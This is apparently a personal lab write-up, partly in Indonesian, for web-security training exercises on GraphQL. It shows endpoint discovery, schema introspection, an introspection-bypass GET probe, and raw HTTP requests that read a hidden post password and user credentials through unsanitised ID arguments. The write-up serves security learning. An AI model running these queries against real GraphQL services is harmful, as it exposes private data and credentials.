
## Common endpoint names

GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, you should look to send universal queries to the following locations:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

## Metode permintaan

Langkah selanjutnya dalam mencoba menemukan titik akhir GraphQL adalah menguji menggunakan metode permintaan yang berbeda.

Praktik terbaik untuk titik akhir produksi GraphQL adalah hanya menerima permintaan POST yang memiliki tipe konten `application/json`, karena hal ini membantu melindungi dari kerentanan CSRF. Namun, beberapa titik akhir mungkin menerima metode alternatif, seperti permintaan GET atau permintaan POST yang menggunakan tipe konten `x-www-form-urlencoded`.


## Memanfaatkan argumen yang tidak bersih - Lanjutan

Misalnya, kueri di bawah ini meminta daftar produk untuk toko online:

```json
query {
  products {
    id
    name
    listed
  }
}

```

Daftar produk yang dikembalikan hanya berisi produk yang terdaftar.

```json
{
  "data": {
    "products": [
      {
        "id": 1,
        "name": "Product 1",
        "listed": true
      },
      {
        "id": 2,
        "name": "Product 2",
        "listed": true
      },
      {
        "id": 4,
        "name": "Product 4",
        "listed": true
      }
    ]
  }
}
```

Dari informasi ini, kami dapat menyimpulkan hal-hal berikut:

- Produk diberi ID berurutan.
- ID Produk 3 tidak ada dalam daftar, mungkin karena telah dihapus dari daftar.

Dengan menanyakan ID produk yang hilang, kami bisa mendapatkan detailnya, meskipun tidak terdaftar di toko dan tidak dikembalikan oleh permintaan produk asli.

```json
query 
	{ 
	 product(id: 3) 
	 { 
		id 
		name 
		listed 
	  } 
	}
```

```json
query {
  "data": {
    "product": {
      "id": 3,
      "name": "Product 3",
      "listed": "no"
    }
  }
}

```


---

# **SOLVE LAB:**


---

**LAB 1**

di sini saya mencari endpoint grapql terlebih dahulu, setelah mendapatakan endpoind nya saya menggunakan query 

```json
POST /graphql/v1 HTTP/2
Host: 0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net
Cookie: session=QowTnluzKRLLEUX9on6zj9zAkI3QqALL
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net/post?postId=4
Content-Type: application/json
Content-Length: 106
Origin: https://0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

{"query":"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}"}
```


untuk mencari filed apa aja yang tersedia, setelah itu 

```json
POST /graphql/v1 HTTP/2
Host: 0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net
Cookie: session=QowTnluzKRLLEUX9on6zj9zAkI3QqALL
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net/post?postId=4
Content-Type: application/json
Content-Length: 281
Origin: https://0a7e001e04b4a59380c58ac7009d00b2.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n  isPrivate\n       postPassword\n      }\n    }","operationName":"getBlogPost","variables":{"id":3}}
```

dan akan mendapatkan sebuah password nya

```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3203

{
  "data": {
    "getBlogPost": {
      "image": "/image/blog/posts/24.jpg",
      "title": "The Reverse Bucket List",
      "author": "Neil Beforeme",
      "date": "2024-08-20T15:52:06.922Z",
      "paragraphs": [
        "I have yet to create a bucket list, mainly because I'm not very adventurous and don't want to do anything that will scare the pants off me. With my weekends wasting away with a huge dose of apathy and only a spoonful of activity, I felt it was time to try something new. I like to call it the Reverse Bucket List, doing things you think you should do, but don't really want to.",
        "The first class I signed up to was freefall yoga. I wasn't sure of the freefall part but I'd seen great videos of people doing yoga in hammock type things and thought it would probably be a bit like that. At this point it's worth mentioning I hate yoga, I thought I'd start with the things I hate the most and work up.",
        "Weeks of grueling body bending ensued and not a hammock in sight. The only falling taking place was when I tried to get out of bed in the mornings. Why would something that promotes suppleness and fitness leave you incapable of descending the stairs and leave you with the added inability to dress yourself as you can no longer lift your arms above your head?",
        "The day of certification was drawing close and there seemed to be great excitement among the group. We were rather oddly, I thought, asked to meet the following weekend at a local airfield. It was to be a weekend affair with swanky overnight accommodation and Canap's. On arrival, we were greeted with a glass of champagne and asked to change into our yoga gear. What followed next will haunt me until the day I die.",
        "If I didn't recognize my group and our yogini, I would have assumed I'd turned up at the wrong venue and made my excuses. It is not unheard of for me to turn up at the wrong venue. At the end of a long weekend of parachute drills - which I assumed was all in aid of team building - we were led out to the airstrip and boarded a light aircraft. It was at this point I started to get a little suspicious. We were instructed to begin our descent in a Chakrasana position, double flip it, twist into a Trikonasana, and land in a Tadasana.",
        "Jumping from an airplane has never been on my Bucket List, and certainly not on my reverse bucket list. Despite my squealing protests, I was pushed forward until I was teetering on the edge of despair. Someone shouted, 'assume the pose' as I flopped into a downward descent. There were poses, none of them yoga poses, I made a star jump as I floundered to find something to hold on to, nothing but air up there. I then passed out and miraculously landed on a large trampoline bouncing me back up into the air, inadvertently landing in a Gomukhasana. To those of you who don't know what that is, it basically looks like a jumbled mess.",
        "Needless to say, there wasn't a certificate presented to me that day. I am now reevaluating my life goals and reading the small print in all paperwork from now on."
      ],
      "isPrivate": true,
      "postPassword": "gdkx4hlauabey77y8ydax0xr3iq6evw3"
    }
  }
}
```


**LAB 2**

cara nya hampir sama kayak  **Lab 1** ,

```json
POST /graphql/v1 HTTP/2
Host: 0a12006104090d1e8347786200510083.web-security-academy.net
Cookie: session=YwK1fJ0zaVkC0MBwsPwCNkfKCa35CjED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a12006104090d1e8347786200510083.web-security-academy.net/login
Content-Type: application/json
Content-Length: 198
Origin: https://0a12006104090d1e8347786200510083.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{
  "query": "\n    query getUser($id: Int!) {\n        getUser(id: $id) {\n            id\n            username\n            password\n        }\n    }",
  "variables": {
    "id": 1
  }
}
```

## Bypassing GraphQL introspection defenses 

	Introspection probe as GET request GET 


```json
/graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

